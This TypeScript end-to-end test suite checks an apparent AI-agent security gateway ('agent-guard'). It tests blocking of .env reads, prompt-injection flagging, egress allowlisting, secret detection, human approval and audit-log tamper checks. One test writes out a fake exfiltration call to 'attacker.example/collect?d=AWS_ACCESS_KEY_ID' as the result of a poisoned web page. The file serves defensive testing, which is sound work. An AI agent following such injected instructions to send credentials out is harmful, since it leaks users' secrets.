import { spawn, type ChildProcess } from "node:child_process";
import { copyFileSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { ApprovalStore } from "../../src/approval/store.js";
import { FAKE_ANTHROPIC_KEY, FAKE_AWS_KEY, startWebHttp } from "../../examples/demo/servers.js";
import { CLI, cli, connectGateway, DEMO_CONFIG, freePort, ROOT, tempDir, textOf, waitFor } from "./helpers.js";

let web: Awaited<ReturnType<typeof startWebHttp>>;
beforeAll(async () => {
  web = await startWebHttp();
});
afterAll(async () => {
  await web.close();
});

describe("e2e: MCP client -> agent-guard (stdio) -> demo upstreams (stdio + HTTP)", () => {
  let client: Client;
  let stateDir: string;

  beforeAll(async () => {
    stateDir = tempDir();
    client = await connectGateway({ stateDir, webUrl: web.url });
  });
  afterAll(async () => {
    await client.close();
  });

  it("aggregates both upstreams under namespaced names and hides the poisoned tool", async () => {
    const { tools } = await client.listTools();
    expect(tools.map((t) => t.name).sort()).toEqual(["corp__read_file", "corp__send_email", "web__fetch_url", "web__http_post"]);
  });

  it("allows workspace reads and enforces the .env deny rule, including traversal", async () => {
    expect(textOf(await client.callTool({ name: "corp__read_file", arguments: { path: "/workspace/README.md" } }))).toContain("Billing service");
    for (const path of ["/workspace/.env", "/workspace/sub/../.env"]) {
      const r = await client.callTool({ name: "corp__read_file", arguments: { path } });
      expect(r.isError).toBe(true);
      expect(textOf(r)).toMatch(/\.env files hold credentials \(rule: block-dotenv\)/);
    }
  });

  it("blocks the exfiltration chain from a poisoned web page", async () => {
    // A fresh agent session: fetch the attacker-controlled page.
    const s2 = await connectGateway({ stateDir, webUrl: web.url });
    try {
      const page = textOf(await s2.callTool({ name: "web__fetch_url", arguments: { url: "https://blog.example.net/ci-tips" } }));
      expect(page).toMatch(/flagged possible prompt injection/);
      expect(page).toMatch(/<untrusted-content id=/);
      expect(page).toContain("[image removed by agent-guard: untrusted host attacker.example]");

      // The injected instruction asks to send data to attacker.example: egress allowlist blocks it.
      const exfil = await s2.callTool({ name: "web__fetch_url", arguments: { url: "https://attacker.example/collect?d=AWS_ACCESS_KEY_ID" } });
      expect(textOf(exfil)).toMatch(/non-allowlisted host\(s\): attacker\.example/);

      // Even to an allowlisted host, secrets in egress arguments are refused.
      const leak = await s2.callTool({ name: "web__http_post", arguments: { url: "https://docs.example.com/paste", body: FAKE_AWS_KEY } });
      expect(textOf(leak)).toMatch(/contain secrets \(aws_access_key_id\)/);
    } finally {
      await s2.close();
    }
  });

  it("escalates the lethal trifecta to a human and honours a CLI deny", async () => {
    const s3 = await connectGateway({ stateDir, webUrl: web.url });
    try {
      await s3.callTool({ name: "web__fetch_url", arguments: { url: "https://docs.example.com/ci" } });
      const pending = s3.callTool({ name: "corp__read_file", arguments: { path: "/workspace/customers.csv" } });
      const store = new ApprovalStore(stateDir);
      const req = await waitFor(() => store.list("pending").find((e) => e.ruleId === "lethal-trifecta"));
      const listed = await cli(["pending", "--state-dir", stateDir]);
      expect(listed.stdout).toContain(req.id);
      const denied = await cli(["deny", req.id, "--state-dir", stateDir]);
      expect(denied.code).toBe(0);
      const r = await pending;
      expect(r.isError).toBe(true);
      expect(textOf(r)).toMatch(/human approval denied \(lethal trifecta/);
    } finally {
      await s3.close();
    }
  });

  it("parks external email for approval and forwards it after `agent-guard approve`", async () => {
    const pending = client.callTool({ name: "corp__send_email", arguments: { to: "partner@other.example", subject: "Q3", body: "hello" } });
    const store = new ApprovalStore(stateDir);
    const req = await waitFor(() => store.list("pending").find((e) => e.tool === "send_email"));
    expect((await cli(["approve", req.id, "--state-dir", stateDir])).stdout).toContain(`Approved ${req.id}`);
    // Output PII redaction is on in the demo config, so the echoed address comes back redacted.
    expect(textOf(await pending)).toBe("queued email to [REDACTED:email]: Q3");
    // Internal email needs no approval.
    expect(textOf(await client.callTool({ name: "corp__send_email", arguments: { to: "ops@example.com", subject: "hi", body: "x" } }))).toContain("queued");
  });

  it("produces an audit log that verifies, and detects tampering", async () => {
    const log = join(stateDir, "audit.jsonl");
    const contents = readFileSync(log, "utf8");
    expect(contents).not.toContain(FAKE_AWS_KEY);
    expect(contents).not.toContain(FAKE_ANTHROPIC_KEY);
    const ok = await cli(["verify-log", log]);
    expect(ok.code).toBe(0);
    expect(ok.stdout).toMatch(/^OK/);

    const copy = join(tempDir(), "tampered.jsonl");
    copyFileSync(log, copy);
    const lines = readFileSync(copy, "utf8").split("\n");
    const idx = lines.findIndex((l) => l.includes('"decision":"deny"'));
    lines[idx] = (lines[idx] as string).replace('"decision":"deny"', '"decision":"allow"');
    writeFileSync(copy, lines.join("\n"));
    const bad = await cli(["verify-log", copy]);
    expect(bad.code).toBe(1);
    expect(bad.stdout).toMatch(new RegExp(`TAMPERED[\\s\\S]*line ${idx + 1}: hash mismatch`));
  });
});

describe("e2e: Streamable HTTP downstream with per-agent bearer tokens", () => {
  let proc: ChildProcess;
  let url: string;
  const token = "readonly-bot-token-0123456789";

  beforeAll(async () => {
    const port = await freePort();
    url = `http://127.0.0.1:${port}/mcp`;
    proc = spawn(process.execPath, ["--import", "tsx", CLI, "serve", "--config", DEMO_CONFIG, "--state-dir", tempDir(), "--http", "--port", String(port)], {
      cwd: ROOT,
      env: { ...process.env, DEMO_WEB_URL: web.url, READONLY_BOT_TOKEN: token, AGENT_GUARD_LOG_LEVEL: "info" },
      stdio: ["ignore", "ignore", "pipe"],
    });
    let stderr = "";
    proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
    await waitFor(() => stderr.includes("serving Streamable HTTP"), 20_000);
  });
  afterAll(() => {
    proc.kill("SIGTERM");
  });

  it("rejects requests without a valid token", async () => {
    const res = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" });
    expect(res.status).toBe(401);
  });

  it("scopes tools to the agent identified by the token", async () => {
    const client = new Client({ name: "bot", version: "1.0.0" });
    await client.connect(new StreamableHTTPClientTransport(new URL(url), { requestInit: { headers: { Authorization: `Bearer ${token}` } } }));
    try {
      const { tools } = await client.listTools();
      expect(tools.map((t) => t.name).sort()).toEqual(["corp__read_file", "web__fetch_url"]);
      const r = await client.callTool({ name: "web__http_post", arguments: { url: "https://docs.example.com", body: "x" } });
      expect(textOf(r)).toMatch(/agent 'readonly-bot' lacks capability for web\.http_post/);
      expect(textOf(await client.callTool({ name: "corp__read_file", arguments: { path: "/workspace/README.md" } }))).toContain("Billing");
    } finally {
      await client.close();
    }
  });
});
